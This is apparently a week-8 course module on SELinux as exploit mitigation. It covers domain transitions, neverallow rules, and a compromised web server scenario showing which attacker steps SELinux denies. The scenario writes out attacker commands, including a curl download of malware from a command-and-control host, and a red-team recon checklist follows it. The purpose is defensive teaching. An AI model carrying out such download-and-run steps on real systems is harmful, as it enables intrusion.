# Phase 8: Advanced & Offensive Thinking (Week 8)

## Concepts
Now that you know how to build, let's look at how SELinux stops attackers—and how attackers think about SELinux.

### SELinux as Exploit Mitigation
SELinux is primarily a means of **Mitigation**, not Prevention of the initial bug.
*   **Buffer Overflow in Apache**: SELinux doesn't stop the memory corruption.
*   **Shellcode Execution**: SELinux **DOES** stop the shellcode if it tries to connect to a new port, read `/etc/shadow`, or execute a binary in `/tmp`.

### Domain Transitions
How does `init` (which runs as `init_t`) start Apache (`httpd_t`)?
This is a **Domain Transition**.
*   Rule: `allow init_t httpd_exec_t:file { execute };`
*   Transition: A process in domain `A` executes a file of type `B`, and the process becomes domain `C`.

### Neverallow Rules
The policy contains "assertions" that can never be violated, even if you write an `audit2allow` module to allow it.
*   *Example*: `neverallow` rules often prevent simple users (`user_t`) from reading raw memory device files.

## Hands-On: The "What If" Exercise

### Scenario: The compromised web server
Imagine an attacker gets Remote Code Execution (RCE) on your PHP app.

**Without SELinux:**
1.  Attacker uploads a "web shell".
2.  Attacker runs `whoami` -> `apache`.
3.  Attacker runs `find / -name "backup.tar.gz"` -> access allowed (DAC allows world-read).
4.  Attacker runs `curl http://c2-server.com/malware` -> access allowed.
5.  Attacker executes malware -> access allowed (if `/tmp` is executable).

**With SELinux (Targeted Policy):**
1.  Attacker uploads a "web shell".
2.  Attacker runs `whoami` -> `unconfined_u:system_r:httpd_t:s0`.
3.  Attacker runs `find / -name "backup.tar.gz"` -> **DENIED** (httpd_t cannot read `admin_home_t` or generic files depending on policy).
4.  Attacker runs `curl` -> **DENIED** (unless `httpd_can_network_connect` is on).
5.  Attacker executes malware in `/tmp` -> **DENIED** (httpd_t usually cannot execute files in `tmp_t`).

## Offensive Check
If you are on the Red Team:
*   Checking for `Permissive`: `getenforce`
*   Checking for Booleans: `getsebool` (Maybe the admin left `httpd_enable_homedirs` on?)
*   Privilege Escalation: Look for custom modules with loose rules (`semodule -l`).

## Key Takeaway
> **SELinux buys you time.** It turns a "Game Over" RCE into a "frustratingly limited" shell for the attacker, giving your blue team time to detect the AVC denials and react.
